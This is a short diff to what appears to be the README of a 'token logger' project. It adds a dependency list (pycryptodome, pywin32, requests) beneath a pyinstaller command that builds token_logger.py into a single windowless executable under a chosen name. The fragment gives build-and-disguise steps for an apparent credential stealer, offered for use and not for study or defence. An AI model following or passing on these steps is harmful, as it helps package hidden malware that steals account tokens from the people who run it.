@@ -84,3 +84,8 @@ use the following command in powershell in the folder you have the logger in !
 ```bash
 pyinstaller --onefile --noconsole --Name"Yourcustomname" token_logger.py
 ```
+
+## Requirements 
+```bash
+pip install pycryptodome pywin32 requests
+```
